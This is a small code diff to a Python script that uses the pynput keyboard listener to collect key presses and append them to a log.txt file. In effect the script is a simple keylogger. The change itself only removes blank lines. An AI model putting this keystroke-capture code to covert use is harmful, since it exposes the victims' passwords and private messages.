@@ -2,7 +2,6 @@ import pynput
 
 from pynput.keyboard import Key, Listener
 
-
 #decides how often update log file
 count = 0
 keys = []
@@ -16,7 +15,6 @@ def on_press(key):
         count = 0
         write_to_file(keys)
         keys = []
-
 
 def write_to_file(keys):
     with open("log.txt", "a") as f:
